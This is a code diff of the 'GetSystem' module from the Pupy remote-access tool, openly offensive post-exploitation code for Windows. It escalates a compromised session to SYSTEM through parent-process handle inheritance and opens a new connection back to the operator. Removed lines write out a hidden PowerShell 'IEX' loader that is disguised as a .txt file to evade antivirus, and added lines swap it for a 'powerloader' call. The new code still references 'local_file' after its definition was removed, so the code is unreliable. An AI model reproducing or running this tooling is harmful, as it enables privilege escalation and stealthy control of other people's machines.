@@ -2,12 +2,10 @@
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from modules.lib.windows.migrate import migrate
-from rpyc.utils.classic import upload
+
+from modules.lib.windows import powerloader
 
 import os
-import pupygen
-import string
-import random
 
 __class_name__="GetSystem"
 
@@ -22,8 +20,8 @@ class GetSystem(PupyModule):
     it will create a new SYSTEM process thanks to a handle inheritance ('inheritance' method) aka 'parent method'.
     In this case, the created SYSTEM launcher will connect to your pupy contoller automatically.
     - Case 2: If the launcher on the target uses a bind connection, this module will enable the 'powershell' option by default.
-    In this case, a ps1 script will be uploaded and it will be executed as System on the target.
-    This ps1 script listens on your given port on the target. You have to connect to this launcher manually.
+    In this case, a payload will be uploaded and it will be executed as System on the target.
+    This payload listens on your given port on the target. You have to connect to this launcher manually.
     """
 
     dependencies=["pupwinutils.security", "pupwinutils.processes"]
@@ -80,6 +78,8 @@ class GetSystem(PupyModule):
         # Usefull information for bind mode connection (ps1 script)
         launcherType, addressPort = self.client.desc['launcher'], self.client.desc['address']
 
+        completion = None
+
         # Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
         if launcherType == "bind":
             self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
@@ -94,11 +94,6 @@ class GetSystem(PupyModule):
         if args.powershell:
             self.info('A powershell payload will be used for getting a pupy session as SYSTEM')
             clientConfToUse = None
-            ros         = self.client.conn.modules['os']
-            rtempfile   = self.client.conn.modules['tempfile']
-            tempdir     = rtempfile.gettempdir()
-            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
-            remotefile  = ''
 
             if isBindLauncherForPs1:
                 self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))
@@ -121,24 +116,7 @@ class GetSystem(PupyModule):
                 self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')
                 clientConfToUse = self.client.get_conf()
 
-            self.info("Generating the PS1 script locally...")
-
-            if '64' in  self.client.desc['proc_arch']:
-                local_file = pupygen.generate_ps1(self.log, clientConfToUse, x64=True)
-            else:
-                local_file = pupygen.generate_ps1(self.log, clientConfToUse, x86=True)
-
-            # change the ps1 to txt file to avoid AV detection
-            random_name += '.txt'
-            remotefile  = ros.path.join(tempdir, random_name)
-
-            cmd     = ur'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe'
-            param   = u'-w hidden -noni -nop -c "cat %s | Out-String | IEX"' % remotefile
-
-            cmdToExecute = '%s %s' % (cmd, param)
-
-            self.info("Uploading file in %s" % remotefile)
-            upload(self.client.conn, local_file, remotefile)
+            cmdToExecute, completion = powerloader.serve(self, clientConfToUse)
 
         # restart current exe as system
         if args.restart:
@@ -192,11 +170,10 @@ class GetSystem(PupyModule):
                     try:
                         pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)
                         self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))
-                        return
+                        break
 
                     except Exception, e:
                         self.error('Failed: {}'.format(' '.join(x for x in e.args if type(x) is str)))
-
 
         elif args.method == 'impersonate':
             if cmdToExecute is None:
@@ -210,6 +187,10 @@ class GetSystem(PupyModule):
             return
 
         if args.powershell:
+            if completion and not completion.is_set():
+                self.info('Waiting for PowerLoader completion')
+                completion.wait()
+
             if isBindLauncherForPs1:
                 self.success(
                     'You have to connect to the target manually on {0}: '
@@ -217,4 +198,5 @@ class GetSystem(PupyModule):
             else:
                 self.success('Waiting for a connection (take few seconds, 1 min max)...')
 
-            os.remove(local_file)
+            if local_file:
+                os.remove(local_file)
